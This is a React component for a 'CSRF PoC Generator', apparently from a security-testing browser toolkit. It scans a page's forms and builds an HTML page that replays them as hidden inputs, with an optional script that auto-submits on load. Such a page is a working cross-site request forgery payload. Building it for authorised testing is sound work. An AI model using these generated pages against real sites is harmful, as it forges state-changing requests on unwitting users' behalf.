import React, { useState } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faCode, faCopy, faCheck, faSync, faExternalLinkAlt } from '@fortawesome/free-solid-svg-icons';

export type FormInfo = {
  index: number;
  action: string;
  method: string;
  fields: { name: string; type: string; value: string }[];
};

export type CsrfPocGeneratorData = {
  forms?: FormInfo[];
  selectedFormIndex?: number;
  output?: string;
  autoSubmit?: boolean;
  customAction?: string;
};

type Props = {
  data: CsrfPocGeneratorData | undefined;
  onChange: (data: CsrfPocGeneratorData) => void;
};

const CsrfPocGenerator: React.FC<Props> = ({ data, onChange }) => {
  const forms = data?.forms ?? [];
  const selectedFormIndex = data?.selectedFormIndex ?? 0;
  const output = data?.output ?? '';
  const autoSubmit = data?.autoSubmit ?? true;
  const customAction = data?.customAction ?? '';
  const [copied, setCopied] = useState(false);

  const scanForms = () => {
    const pageForms = document.querySelectorAll('form');
    const formInfos: FormInfo[] = [];

    pageForms.forEach((form, index) => {
      const action = form.action || window.location.href;
      const method = (form.method || 'GET').toUpperCase();
      const fields: FormInfo['fields'] = [];

      const inputs = form.querySelectorAll('input, textarea, select');
      inputs.forEach(input => {
        const name = input.getAttribute('name');
        if (name) {
          const type = input.getAttribute('type') || input.tagName.toLowerCase();
          let value = '';
          if (input instanceof HTMLInputElement || input instanceof HTMLTextAreaElement) {
            value = input.value;
          } else if (input instanceof HTMLSelectElement) {
            value = input.value;
          }
          fields.push({ name, type, value });
        }
      });

      formInfos.push({ index, action, method, fields });
    });

    onChange({ ...data, forms: formInfos, selectedFormIndex: 0 });
  };

  const generatePoc = () => {
    if (forms.length === 0) return;

    const form = forms[selectedFormIndex];
    if (!form) return;

    const action = customAction.trim() || form.action;
    const method = form.method;

    const fieldsHtml = form.fields
      .map(f => {
        if (f.type === 'hidden' || f.type === 'text' || f.type === 'password' || f.type === 'email') {
          return `    <input type="hidden" name="${escapeHtml(f.name)}" value="${escapeHtml(f.value)}" />`;
        }
        if (f.type === 'textarea') {
          return `    <input type="hidden" name="${escapeHtml(f.name)}" value="${escapeHtml(f.value)}" />`;
        }
        return `    <input type="hidden" name="${escapeHtml(f.name)}" value="${escapeHtml(f.value)}" />`;
      })
      .join('\n');

    const autoSubmitScript = autoSubmit
      ? `\n  <script>\n    document.getElementById('csrfForm').submit();\n  </script>`
      : '';

    const poc = `<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
</head>
<body>
  <h1>CSRF Proof of Concept</h1>
  <form id="csrfForm" action="${escapeHtml(action)}" method="${method}">
${fieldsHtml}
    <input type="submit" value="Submit" />
  </form>${autoSubmitScript}
</body>
</html>`;

    onChange({ ...data, output: poc });
  };

  const escapeHtml = (str: string): string => {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  };

  const copyOutput = () => {
    navigator.clipboard.writeText(output);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const openAsDataUrl = () => {
    const dataUrl = 'data:text/html;base64,' + btoa(output);
    window.open(dataUrl, '_blank');
  };

  const selectedForm = forms[selectedFormIndex];

  return (
    <div className="flex flex-col h-full">
      <div className="flex items-center justify-between mb-3">
        <div className="text-xs text-slate-200">CSRF PoC Generator</div>
        <div className="flex gap-2">
          <button
            onClick={scanForms}
            className="rounded bg-slate-800 px-2 py-1 text-[10px] text-slate-300 hover:bg-slate-700 transition-colors flex items-center gap-1"
          >
            <FontAwesomeIcon icon={faSync} className="w-3 h-3" />
            Scan Forms
          </button>
        </div>
      </div>

      <div className="text-[10px] text-slate-500 mb-3">
        Generates CSRF proof-of-concept HTML for forms on the current page.
      </div>

      {forms.length > 0 && (
        <>
          <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-3">
            <div className="text-[10px] text-slate-500 mb-1">Select Form</div>
            <select
              value={selectedFormIndex}
              onChange={(e) => onChange({ ...data, selectedFormIndex: parseInt(e.target.value) })}
              className="w-full rounded bg-slate-800 text-slate-200 text-[11px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-blue-500"
            >
              {forms.map((form, i) => (
                <option key={i} value={i}>
                  Form #{i + 1}: {form.method} {form.action.substring(0, 50)}
                  {form.action.length > 50 ? '...' : ''}
                </option>
              ))}
            </select>
          </div>

          {selectedForm && (
            <div className="rounded border border-slate-700 bg-slate-800/50 p-2 mb-3 space-y-1">
              <div className="text-[10px]"><span className="text-slate-500">Action:</span> <span className="text-slate-300">{selectedForm.action}</span></div>
              <div className="text-[10px]"><span className="text-slate-500">Method:</span> <span className="text-slate-300">{selectedForm.method}</span></div>
              <div>
                <span className="text-[10px] text-slate-500">Fields ({selectedForm.fields.length}):</span>
                <div className="mt-1 max-h-20 overflow-y-auto space-y-0.5">
                  {selectedForm.fields.map((f, i) => (
                    <div key={i} className="text-[10px] text-slate-500 pl-2">
                      {f.name} ({f.type}){f.value ? `: "${f.value.substring(0, 20)}${f.value.length > 20 ? '...' : ''}"` : ''}
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-3">
            <div className="text-[10px] text-slate-500 mb-1">Custom Action URL (optional)</div>
            <input
              type="url"
              value={customAction}
              onChange={(e) => onChange({ ...data, customAction: e.target.value })}
              placeholder="Leave empty to use original action"
              className="w-full rounded bg-slate-800 text-slate-200 text-[11px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-blue-500"
            />
          </div>

          <label className="flex items-center gap-2 text-[11px] text-slate-300 cursor-pointer mb-3">
            <input
              type="checkbox"
              checked={autoSubmit}
              onChange={(e) => onChange({ ...data, autoSubmit: e.target.checked })}
              className="rounded"
            />
            Auto-submit on page load
          </label>

          <button
            onClick={generatePoc}
            className="w-full rounded bg-red-600/20 border border-red-500/30 px-2 py-1.5 text-[11px] text-red-300 hover:bg-red-600/30 transition-colors flex items-center justify-center gap-2"
          >
            <FontAwesomeIcon icon={faCode} className="w-3 h-3" />
            Generate CSRF PoC
          </button>
        </>
      )}

      {output && (
        <div className="mt-3 flex-1 overflow-y-auto min-h-0">
          <div className="flex items-center justify-between mb-2">
            <span className="text-[11px] font-medium text-slate-300">Generated PoC:</span>
            <div className="flex gap-2">
              <button
                onClick={copyOutput}
                className="rounded bg-slate-800 px-2 py-1 text-[10px] text-slate-300 hover:bg-slate-700 transition-colors flex items-center gap-1"
              >
                <FontAwesomeIcon icon={copied ? faCheck : faCopy} className="w-2.5 h-2.5" />
                {copied ? 'Copied!' : 'Copy'}
              </button>
              <button
                onClick={openAsDataUrl}
                className="rounded bg-slate-800 px-2 py-1 text-[10px] text-slate-300 hover:bg-slate-700 transition-colors flex items-center gap-1"
              >
                <FontAwesomeIcon icon={faExternalLinkAlt} className="w-2.5 h-2.5" />
                Preview
              </button>
            </div>
          </div>
          <pre className="text-[10px] rounded border border-slate-700 bg-slate-800/50 p-2 overflow-auto max-h-48 text-slate-300 whitespace-pre-wrap">
            {output}
          </pre>
        </div>
      )}

      {forms.length === 0 && (
        <div className="text-[11px] text-slate-500 text-center py-4">
          Click "Scan Forms" to detect forms on this page.
        </div>
      )}
    </div>
  );
};

export class CsrfPocGeneratorTool {
  static Component = CsrfPocGenerator;
}
